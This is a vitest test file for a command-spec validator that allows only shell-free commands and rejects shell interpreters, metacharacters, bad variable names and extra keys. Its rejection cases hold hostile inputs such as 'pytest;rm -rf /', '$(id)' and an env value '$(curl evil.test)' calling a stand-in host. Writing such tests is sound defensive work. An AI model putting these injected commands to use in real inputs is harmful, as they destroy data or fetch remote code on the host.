import { describe, expect, test } from "vitest";

import { CommandSpecSchema } from "./command.js";

const ok = { bin: "python", args: ["-m", "pytest", "-q"] };

describe("CommandSpecSchema", () => {
  test("accepts a minimal shell-free command", () => {
    expect(CommandSpecSchema.safeParse(ok).success).toBe(true);
  });

  test("accepts cwd and env", () => {
    expect(
      CommandSpecSchema.safeParse({ ...ok, cwd: "/testbed", env: { PYTHONHASHSEED: "0" } })
        .success,
    ).toBe(true);
  });

  test("accepts an empty argument list", () => {
    expect(CommandSpecSchema.safeParse({ bin: "make", args: [] }).success).toBe(true);
  });

  test("rejects a shell interpreter as bin", () => {
    for (const bin of ["sh", "bash", "zsh", "dash", "/bin/sh", "/usr/bin/env bash", "cmd", "powershell", "pwsh"]) {
      const result = CommandSpecSchema.safeParse({ bin, args: ["-c", "pytest -q"] });
      expect(result.success, `${bin} must be refused`).toBe(false);
    }
  });

  test("rejects a shell interpreter spelled with .exe or in another case", () => {
    for (const bin of [
      "bash.exe", "sh.exe", "zsh.exe", "dash.exe", "pwsh.EXE",
      "/bin/SH", "Bash", "/usr/bin/env BASH", "C:/Windows/System32/cmd.EXE",
    ]) {
      const result = CommandSpecSchema.safeParse({ bin, args: ["-c", "pytest -q"] });
      expect(result.success, `${bin} must be refused`).toBe(false);
    }
  });

  test("rejects shell metacharacters anywhere in bin, args, or cwd", () => {
    expect(CommandSpecSchema.safeParse({ bin: "pytest;rm -rf /", args: [] }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ bin: "pytest", args: ["-q && curl x"] }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ bin: "pytest", args: ["$(id)"] }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ bin: "pytest", args: ["`id`"] }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ bin: "pytest", args: ["a|b"] }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ bin: "pytest", args: [], cwd: "/a>b" }).success).toBe(false);
  });

  test("rejects an env value carrying a shell metacharacter", () => {
    expect(
      CommandSpecSchema.safeParse({ ...ok, env: { HOOK: "$(curl evil.test)" } }).success,
    ).toBe(false);
  });

  test("rejects a non-conforming environment variable name", () => {
    expect(CommandSpecSchema.safeParse({ ...ok, env: { "bad name": "1" } }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ ...ok, env: { "1BAD": "1" } }).success).toBe(false);
  });

  test("rejects an empty bin and empty-string args", () => {
    expect(CommandSpecSchema.safeParse({ bin: "", args: [] }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ bin: "pytest", args: [""] }).success).toBe(false);
  });

  test("is strict: no extra keys, namespaced or not", () => {
    expect(CommandSpecSchema.safeParse({ ...ok, shell: true }).success).toBe(false);
    expect(CommandSpecSchema.safeParse({ ...ok, "network.jinn.note": "x" }).success).toBe(false);
  });
});
